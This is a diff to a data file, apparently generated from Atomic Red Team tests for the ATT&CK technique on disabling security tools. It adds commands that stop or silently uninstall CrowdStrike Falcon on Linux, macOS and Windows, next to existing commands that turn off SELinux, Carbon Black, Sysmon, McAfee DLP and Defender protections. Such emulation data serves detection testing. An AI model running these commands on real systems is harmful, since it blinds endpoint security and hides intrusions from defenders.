@@ -52,11 +52,20 @@ fi
 
 setenforce 0
 
+sudo systemctl stop falcon-sensor.service
+sudo systemctl disable falcon-sensor.service
+
 sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
 
 sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
 
 sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
+
+sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist
+sudo launchctl unload #{userdaemon_plist}
+
+sudo launchctl unload #{falcond_plist}
+sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist
 
 fltmc.exe unload SysmonDrv
 
@@ -94,6 +103,8 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\Prot
 
 Stop-Service -Name McAfeeDLPAgentService
 Remove-Service -Name McAfeeDLPAgentService
+
+if (Test-Path "C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe") {. "C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe" /repair /uninstall /quiet } else { Get-ChildItem -Path "C:\ProgramData\Package Cache" -Include "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}
 {'windows': {'psh': {'command': 'Set-MPPreference -DisableRealtimeMonitoring 1\n', 'cleanup': 'Set-MPPreference -DisableRealtimeMonitoring 0'}}}
 {'windows': {'psh': {'command': 'Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;\n', 'cleanup': 'Set-MpPreference -DisableIntrusionPreventionSystem $false;\nSet-MpPreference -DisableIOAVProtection $false;\nSet-MpPreference -DisableRealtimeMonitoring $false;\nSet-MpPreference -DisableScriptScanning $false;\nSet-MpPreference -EnableControlledFolderAccess Enabled;\n'}}}
 powershell/management/disable_rdp
@@ -144,6 +155,10 @@ powershell/management/disable_rdp
  {'command': 'setenforce 0\n',
   'name': None,
   'source': 'atomics/T1089/T1089.yaml'},
+ {'command': 'sudo systemctl stop falcon-sensor.service\n'
+             'sudo systemctl disable falcon-sensor.service\n',
+  'name': None,
+  'source': 'atomics/T1089/T1089.yaml'},
  {'command': 'sudo launchctl unload '
              '/Library/LaunchDaemons/com.carbonblack.daemon.plist\n',
   'name': None,
@@ -154,6 +169,16 @@ powershell/management/disable_rdp
   'source': 'atomics/T1089/T1089.yaml'},
  {'command': 'sudo launchctl unload '
              '/Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n',
+  'name': None,
+  'source': 'atomics/T1089/T1089.yaml'},
+ {'command': 'sudo launchctl unload '
+             '/Library/LaunchDaemons/com.crowdstrike.falcond.plist\n'
+             'sudo launchctl unload #{userdaemon_plist}\n',
+  'name': None,
+  'source': 'atomics/T1089/T1089.yaml'},
+ {'command': 'sudo launchctl unload #{falcond_plist}\n'
+             'sudo launchctl unload '
+             '/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist\n',
   'name': None,
   'source': 'atomics/T1089/T1089.yaml'},
  {'command': 'fltmc.exe unload SysmonDrv\n',
@@ -219,7 +244,19 @@ powershell/management/disable_rdp
   'name': None,
   'source': 'atomics/T1089/T1089.yaml'},
  {'command': 'Stop-Service -Name McAfeeDLPAgentService\n'
-             'Remove-Service -Name McAfeeDLPAgentService',
+             'Remove-Service -Name McAfeeDLPAgentService\n',
+  'name': None,
+  'source': 'atomics/T1089/T1089.yaml'},
+ {'command': 'if (Test-Path "C:\\ProgramData\\Package '
+             'Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe") '
+             '{. "C:\\ProgramData\\Package '
+             'Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe" '
+             '/repair /uninstall /quiet } else { Get-ChildItem -Path '
+             '"C:\\ProgramData\\Package Cache" -Include "WindowsSensor.exe" '
+             '-Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath '
+             '$_.FullName); if ($sig.Status -eq "Valid" -and '
+             '$sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . '
+             '"$_" /repair /uninstall /quiet; break;}}}',
   'name': None,
   'source': 'atomics/T1089/T1089.yaml'},
  {'command': {'windows': {'psh': {'cleanup': 'Set-MPPreference '
@@ -443,6 +480,37 @@ powershell/management/disable_rdp
                                                                         'name': 'Disable '
                                                                                 'SELinux',
                                                                         'supported_platforms': ['linux']},
+                                                                       {'description': 'Stop '
+                                                                                       'and '
+                                                                                       'disable '
+                                                                                       'Crowdstrike '
+                                                                                       'Falcon '
+                                                                                       'on '
+                                                                                       'Linux\n',
+                                                                        'executor': {'cleanup_command': 'sudo '
+                                                                                                        'systemctl '
+                                                                                                        'enable '
+                                                                                                        'falcon-sensor.service\n'
+                                                                                                        'sudo '
+                                                                                                        'systemctl '
+                                                                                                        'start '
+                                                                                                        'falcon-sensor.service\n',
+                                                                                     'command': 'sudo '
+                                                                                                'systemctl '
+                                                                                                'stop '
+                                                                                                'falcon-sensor.service\n'
+                                                                                                'sudo '
+                                                                                                'systemctl '
+                                                                                                'disable '
+                                                                                                'falcon-sensor.service\n',
+                                                                                     'elevation_required': True,
+                                                                                     'name': 'sh'},
+                                                                        'name': 'Stop '
+                                                                                'Crowdstrike '
+                                                                                'Falcon '
+                                                                                'on '
+                                                                                'Linux',
+                                                                        'supported_platforms': ['linux']},
                                                                        {'description': 'Disables '
                                                                                        'Carbon '
                                                                                        'Black '
@@ -478,6 +546,55 @@ powershell/management/disable_rdp
                                                                         'name': 'Disable '
                                                                                 'OpenDNS '
                                                                                 'Umbrella',
+                                                                        'supported_platforms': ['macos']},
+                                                                       {'description': 'Stop '
+                                                                                       'and '
+                                                                                       'unload '
+                                                                                       'Crowdstrike '
+                                                                                       'Falcon '
+                                                                                       'daemons '
+                                                                                       'falcond '
+                                                                                       'and '
+                                                                                       'userdaemon '
+                                                                                       'on '
+                                                                                       'macOS\n',
+                                                                        'executor': {'command': 'sudo '
+                                                                                                'launchctl '
+                                                                                                'unload '
+                                                                                                '#{falcond_plist}\n'
+                                                                                                'sudo '
+                                                                                                'launchctl '
+                                                                                                'unload '
+                                                                                                '#{userdaemon_plist}\n',
+                                                                                     'elevation_required': True,
+                                                                                     'name': 'sh'},
+                                                                        'input_arguments': {'falcond_plist': {'default': '/Library/LaunchDaemons/com.crowdstrike.falcond.plist',
+                                                                                                              'description': 'The '
+                                                                                                                             'path '
+                                                                                                                             'of '
+                                                                                                                             'the '
+                                                                                                                             'Crowdstrike '
+                                                                                                                             'Falcon '
+                                                                                                                             'plist '
+                                                                                                                             'file',
+                                                                                                              'type': 'path'},
+                                                                                            'userdaemon_plist': {'default': '/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist',
+                                                                                                                 'description': 'The '
+                                                                                                                                'path '
+                                                                                                                                'of '
+                                                                                                                                'the '
+                                                                                                                                'Crowdstrike '
+                                                                                                                                'Userdaemon '
+                                                                                                                                'plist '
+                                                                                                                                'file',
+                                                                                                                 'type': 'path'}},
+                                                                        'name': 'Stop '
+                                                                                'and '
+                                                                                'unload '
+                                                                                'Crowdstrike '
+                                                                                'Falcon '
+                                                                                'on '
+                                                                                'macOS',
                                                                         'supported_platforms': ['macos']},
                                                                        {'dependencies': [{'description': 'Sysmon '
                                                                                                          'must '
@@ -1437,7 +1554,7 @@ powershell/management/disable_rdp
                                                                                                 '#{service_name}\n'
                                                                                                 'Remove-Service '
                                                                                                 '-Name '
-                                                                                                '#{service_name}',
+                                                                                                '#{service_name}\n',
                                                                                      'elevation_required': True,
                                                                                      'name': 'powershell'},
                                                                         'input_arguments': {'service_name': {'default': 'McAfeeDLPAgentService',
@@ -1456,6 +1573,107 @@ powershell/management/disable_rdp
                                                                                 'Security '
                                                                                 'Windows '
                                                                                 'Service',
+                                                                        'supported_platforms': ['windows']},
+                                                                       {'description': 'Uninstall '
+                                                                                       'Crowdstrike '
+                                                                                       'Falcon. '
+                                                                                       'If '
+                                                                                       'the '
+                                                                                       'WindowsSensor.exe '
+                                                                                       'path '
+                                                                                       'is '
+                                                                                       'not '
+                                                                                       'provided '
+                                                                                       'as '
+                                                                                       'an '
+                                                                                       'argument '
+                                                                                       'we '
+                                                                                       'need '
+                                                                                       'to '
+                                                                                       'search '
+                                                                                       'for '
+                                                                                       'it. '
+                                                                                       'Since '
+                                                                                       'the '
+                                                                                       'executable '
+                                                                                       'is '
+                                                                                       'located '
+                                                                                       'in '
+                                                                                       'a '
+                                                                                       'folder '
+                                                                                       'named '
+                                                                                       'with '
+                                                                                       'a '
+                                                                                       'random '
+                                                                                       'guid '
+                                                                                       'we '
+                                                                                       'need '
+                                                                                       'to '
+                                                                                       'identify '
+                                                                                       'it '
+                                                                                       'before '
+                                                                                       'invoking '
+                                                                                       'the '
+                                                                                       'uninstaller.\n',
+                                                                        'executor': {'command': 'if '
+                                                                                                '(Test-Path '
+                                                                                                '"#{falcond_path}") '
+                                                                                                '{. '
+                                                                                                '"#{falcond_path}" '
+                                                                                                '/repair '
+                                                                                                '/uninstall '
+                                                                                                '/quiet '
+                                                                                                '} '
+                                                                                                'else '
+                                                                                                '{ '
+                                                                                                'Get-ChildItem '
+                                                                                                '-Path '
+                                                                                                '"C:\\ProgramData\\Package '
+                                                                                                'Cache" '
+                                                                                                '-Include '
+                                                                                                '"WindowsSensor.exe" '
+                                                                                                '-Recurse '
+                                                                                                '| '
+                                                                                                '% '
+                                                                                                '{ '
+                                                                                                '$sig=$(Get-AuthenticodeSignature '
+                                                                                                '-FilePath '
+                                                                                                '$_.FullName); '
+                                                                                                'if '
+                                                                                                '($sig.Status '
+                                                                                                '-eq '
+                                                                                                '"Valid" '
+                                                                                                '-and '
+                                                                                                '$sig.SignerCertificate.DnsNameList '
+                                                                                                '-eq '
+                                                                                                '"CrowdStrike, '
+                                                                                                'Inc.") '
+                                                                                                '{ '
+                                                                                                '. '
+                                                                                                '"$_" '
+                                                                                                '/repair '
+                                                                                                '/uninstall '
+                                                                                                '/quiet; '
+                                                                                                'break;}}}',
+                                                                                     'elevation_required': True,
+                                                                                     'name': 'powershell'},
+                                                                        'input_arguments': {'falcond_path': {'default': 'C:\\ProgramData\\Package '
+                                                                                                                        'Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe',
+                                                                                                             'description': 'The '
+                                                                                                                            'Crowdstrike '
+                                                                                                                            'Windows '
+                                                                                                                            'Sensor '
+                                                                                                                            'path. '
+                                                                                                                            'The '
+                                                                                                                            'Guid '
+                                                                                                                            'always '
+                                                                                                                            'changes.',
+                                                                                                             'type': 'path'}},
+                                                                        'name': 'Uninstall '
+                                                                                'Crowdstrike '
+                                                                                'Falcon '
+                                                                                'on '
+                                                                                'Windows',
                                                                         'supported_platforms': ['windows']}],
                                                       'attack_technique': 'T1089',
                                                       'display_name': 'Disabling '
